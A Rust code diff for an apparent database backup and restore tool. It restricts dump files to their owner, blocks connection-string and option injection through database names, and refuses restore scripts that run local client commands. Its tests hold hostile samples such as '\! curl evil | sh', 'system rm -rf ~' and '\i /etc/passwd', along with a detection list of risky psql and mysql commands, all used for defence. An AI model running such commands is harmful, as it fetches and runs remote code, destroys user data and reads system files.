@@ -103,7 +103,7 @@ fn strip_newer_settings(src: &Path, server: Option<u64>) -> AppResult<Option<Pat
     }
     let out = std::env::temp_dir().join(format!("qurry-restore-{}.sql", uuid::Uuid::new_v4()));
     let mut r = std::io::BufReader::new(std::fs::File::open(src)?);
-    let mut w = std::io::BufWriter::new(std::fs::File::create(&out)?);
+    let mut w = std::io::BufWriter::new(private_file(&out)?);
     let mut line = Vec::new();
     while r.read_until(b'\n', &mut line)? > 0 {
         if !(line.starts_with(b"SET ") && drop.iter().any(|d| line.starts_with(d.as_bytes()))) {
@@ -113,6 +113,65 @@ fn strip_newer_settings(src: &Path, server: Option<u64>) -> AppResult<Option<Pat
     }
     w.flush()?;
     Ok(Some(out))
+}
+
+/// 본인만 읽고 쓰는 파일 (0600). 덤프에는 데이터가 다 들어 있어서 /tmp 에서 남이 읽지 못하게
+fn private_file(path: &Path) -> std::io::Result<std::fs::File> {
+    let mut o = std::fs::OpenOptions::new();
+    o.write(true).create(true).truncate(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
+        o.mode(0o600);
+        let f = o.open(path)?;
+        // 이미 있던 파일 (사용자가 덮어쓰기로 고른 백업 파일) 도
+        f.set_permissions(std::fs::Permissions::from_mode(0o600))?;
+        return Ok(f);
+    }
+    #[allow(unreachable_code)]
+    o.open(path)
+}
+
+/// pg_dump · pg_restore · psql 의 -d: 값은 접속 문자열로도 읽히므로 (host=… 를 넣으면 다른 서버로 간다) DB 이름 하나로 묶는다
+fn pg_dbname(db: &str) -> String {
+    format!("dbname='{}'", db.replace('\\', "\\\\").replace('\'', "\\'"))
+}
+
+/// SQL 파일 안의 클라이언트 명령 중 이 컴퓨터에서 무언가를 하는 것 (psql \! · \o |… · \copy … program · \i, mysql system · tee · pager · source).
+/// COPY … FROM stdin 의 데이터 줄은 보지 않는다. 있으면 그 줄
+pub fn local_command(sql: impl std::io::BufRead, kind: DbKind) -> Option<String> {
+    let mut copy = false;
+    for line in sql.split(b'\n') {
+        let line = String::from_utf8_lossy(&line.ok()?).into_owned();
+        let line = line.trim_end_matches('\r');
+        let t = line.trim_start();
+        if copy {
+            copy = t != "\\.";
+            continue;
+        }
+        let low = t.to_lowercase();
+        if kind == DbKind::Postgres && low.starts_with("copy ") && low.trim_end().ends_with("from stdin;") {
+            copy = true;
+            continue;
+        }
+        let Some(cmd) = t.strip_prefix('\\') else {
+            if kind == DbKind::Mysql && ["system ", "tee ", "pager ", "source ", "notee", "nopager"].iter().any(|c| low.starts_with(c)) {
+                return Some(line.to_string());
+            }
+            continue;
+        };
+        let name: String = cmd.chars().take_while(|c| c.is_ascii_alphanumeric() || *c == '!' || *c == '.').collect::<String>().to_lowercase();
+        let bad = match kind {
+            DbKind::Postgres => name.starts_with('!') || ["i", "ir", "include", "include_relative", "setenv"].contains(&name.as_str())
+                || (["o", "out", "g", "gx", "w", "write"].contains(&name.as_str()) && cmd.contains('|'))
+                || (name == "copy" && cmd.to_lowercase().contains("program")),
+            _ => name.starts_with('!') || ["t", "p", "."].contains(&name.as_str()),
+        };
+        if bad {
+            return Some(line.to_string());
+        }
+    }
+    None
 }
 
 fn missing(tool: &str) -> AppError {
@@ -139,13 +198,21 @@ async fn endpoint(st: &AppState, id: &str) -> AppResult<(String, u16, String, St
     Ok((host, port, cfg.user.clone(), db, st.secret(base)?, cfg))
 }
 
+/// 복원할 SQL 에 이 컴퓨터에서 명령을 돌리는 줄이 있으면 멈춘다 (pg_dump · mysqldump 는 그런 줄을 쓰지 않는다)
+fn refuse_local_commands(file: &Path, kind: DbKind) -> AppResult<()> {
+    match local_command(std::io::BufReader::new(std::fs::File::open(file)?), kind) {
+        Some(line) => Err(AppError::Msg(format!("This file runs commands on your computer, so it was not restored (pg_dump / mysqldump never write these):\n{}", line.chars().take(200).collect::<String>()))),
+        None => Ok(()),
+    }
+}
+
 /// 도구를 돌린다: stdin = 이 파일을 넣으며 진행, stdout = 이 파일로, watch = 이 파일 크기로 진행. 취소되면 끝낸다
 async fn run_tool(mut cmd: tokio::process::Command, tool: &str, stdin: Option<&Path>, stdout: Option<&Path>, watch: Option<&Path>, job: &Arc<Job>) -> AppResult<()> {
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
     cmd.stderr(std::process::Stdio::piped()).kill_on_drop(true);
     cmd.stdin(if stdin.is_some() { std::process::Stdio::piped() } else { std::process::Stdio::null() });
     match stdout {
-        Some(p) => cmd.stdout(std::fs::File::create(p)?),
+        Some(p) => cmd.stdout(private_file(p)?),
         None => cmd.stdout(std::process::Stdio::null()),
     };
     let mut child = cmd.spawn().map_err(|e| AppError::Msg(format!("Could not start {tool}: {e}")))?;
@@ -248,7 +315,8 @@ impl AppState {
                 DbKind::Postgres => {
                     let tool = find_tool_for("pg_dump", pg_major(self, &id).await).ok_or_else(|| missing("pg_dump"))?;
                     let mut cmd = tokio::process::Command::new(tool);
-                    cmd.arg("-h").arg(&host).arg("-p").arg(port.to_string()).arg("-U").arg(&user).arg("-d").arg(&db).arg("--no-password");
+                    cmd.arg("-h").arg(&host).arg("-p").arg(port.to_string()).arg("-U").arg(&user).arg("-d").arg(pg_dbname(&db)).arg("--no-password");
+                    drop(private_file(&file)?);
                     cmd.arg("-F").arg(if opts.format == "plain" { "p" } else { "c" }).arg("-f").arg(&file);
                     if opts.schema_only {
                         cmd.arg("--schema-only");
@@ -273,7 +341,8 @@ impl AppState {
                     if opts.data_only {
                         cmd.arg("--no-create-info");
                     }
-                    cmd.arg(&db);
+                    // -- 뒤는 DB 이름으로만 읽는다 (서버가 보여 준 "--tee=…" 같은 이름이 옵션이 되지 않게)
+                    cmd.arg("--").arg(&db);
                     run_tool(cmd, "mysqldump", None, Some(&file), Some(&file), &job).await?;
                 }
                 DbKind::Redis => return Err(AppError::Msg("Back up Redis with BGSAVE / its RDB file".into())),
@@ -316,26 +385,29 @@ impl AppState {
                         if NEWER_SETTINGS.iter().any(|(_, v)| server.is_some_and(|s| s < *v)) {
                             // 예전 서버: SQL 로 풀어서 모르는 설정을 빼고 psql 로 (pg_restore 는 그 SET 에서 멈춘다)
                             let tmp = std::env::temp_dir().join(format!("qurry-restore-{}.sql", uuid::Uuid::new_v4()));
+                            // pg_restore 가 쓰기 전에 본인만 읽는 파일로 만들어 둔다 (덤프에는 데이터가 다 들어 있다)
+                            drop(private_file(&tmp)?);
                             cmd.arg("-f").arg(&tmp).arg(&file);
                             let r = run_tool(cmd, "pg_restore", None, None, None, &job).await;
                             let stripped = r.and_then(|_| strip_newer_settings(&tmp, server));
                             std::fs::remove_file(&tmp).ok();
                             sql_file = stripped?;
                         } else {
-                            cmd.arg("-h").arg(&host).arg("-p").arg(port.to_string()).arg("-U").arg(&user).arg("-d").arg(&db).arg("--no-password");
+                            cmd.arg("-h").arg(&host).arg("-p").arg(port.to_string()).arg("-U").arg(&user).arg("-d").arg(pg_dbname(&db)).arg("--no-password");
                             cmd.args(["--exit-on-error", "--single-transaction"]);
                             cmd.arg(&file);
                             pg_env(&mut cmd, password.as_deref(), &cfg);
                             run_tool(cmd, "pg_restore", None, None, None, &job).await?;
                         }
                     } else {
+                        refuse_local_commands(&file, DbKind::Postgres)?;
                         sql_file = strip_newer_settings(&file, server)?;
                     }
                     if !custom || sql_file.is_some() {
                         let src = sql_file.clone().unwrap_or_else(|| file.clone());
                         let tool = find_tool_for("psql", server).ok_or_else(|| missing("psql"))?;
                         let mut cmd = tokio::process::Command::new(tool);
-                        cmd.arg("-h").arg(&host).arg("-p").arg(port.to_string()).arg("-U").arg(&user).arg("-d").arg(&db).arg("--no-password");
+                        cmd.arg("-h").arg(&host).arg("-p").arg(port.to_string()).arg("-U").arg(&user).arg("-d").arg(pg_dbname(&db)).arg("--no-password");
                         cmd.args(["-X", "-q", "-v", "ON_ERROR_STOP=1", "--single-transaction", "-f", "-"]);
                         pg_env(&mut cmd, password.as_deref(), &cfg);
                         job.total.store(std::fs::metadata(&src).map(|m| m.len()).unwrap_or(size), Ordering::Relaxed);
@@ -347,10 +419,11 @@ impl AppState {
                     }
                 }
                 DbKind::Mysql => {
+                    refuse_local_commands(&file, DbKind::Mysql)?;
                     let tool = find_tool("mysql").ok_or_else(|| missing("mysql"))?;
                     let mut cmd = tokio::process::Command::new(tool);
                     my_args(&mut cmd, &host, port, &user, password.as_deref(), &cfg);
-                    cmd.arg(&db);
+                    cmd.arg("--").arg(&db);
                     job.total.store(size, Ordering::Relaxed);
                     run_tool(cmd, "mysql", Some(&file), None, None, &job).await?;
                 }
@@ -368,6 +441,38 @@ impl AppState {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn pg_dbname_is_one_literal_name() {
+        assert_eq!(pg_dbname("shop"), "dbname='shop'");
+        assert_eq!(pg_dbname("host=evil dbname=x"), "dbname='host=evil dbname=x'");
+        assert_eq!(pg_dbname("it's\\"), "dbname='it\\'s\\\\'");
+    }
+
+    #[test]
+    fn restore_scripts_with_local_commands_are_refused() {
+        use DbKind::{Mysql, Postgres};
+        assert!(local_command("\\connect shop\nSET x = 1;\nCREATE TABLE t (a int);\nCOPY t (a) FROM stdin;\n\\!rm -rf ~\n\\.\n\\restrict abc\n".as_bytes(), Postgres).is_none());
+        for bad in ["\\! curl evil | sh", "  \\o |cat > ~/.zshrc", "\\g |sh", "\\copy t to program 'sh'", "\\i /etc/passwd", "\\setenv PAGER x"] {
+            assert!(local_command(format!("select 1;\n{bad}\n").as_bytes(), Postgres).is_some(), "{bad}");
+        }
+        assert!(local_command("-- MySQL dump\nCREATE TABLE t (a int);\nINSERT INTO t VALUES (1);\n".as_bytes(), Mysql).is_none());
+        for bad in ["system rm -rf ~", "\\! id", "tee /Users/x/.zshrc", "\\T /tmp/x", "pager sh", "source /etc/passwd"] {
+            assert!(local_command(format!("select 1;\n{bad}\n").as_bytes(), Mysql).is_some(), "{bad}");
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn dump_files_are_private() {
+        use std::os::unix::fs::PermissionsExt;
+        let p = std::env::temp_dir().join(format!("qurry-priv-{}.sql", uuid::Uuid::new_v4()));
+        std::fs::write(&p, "x").unwrap();
+        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o644)).unwrap();
+        drop(private_file(&p).unwrap());
+        assert_eq!(std::fs::metadata(&p).unwrap().permissions().mode() & 0o777, 0o600);
+        std::fs::remove_file(p).ok();
+    }
 
     #[test]
     fn strips_settings_old_servers_do_not_know() {
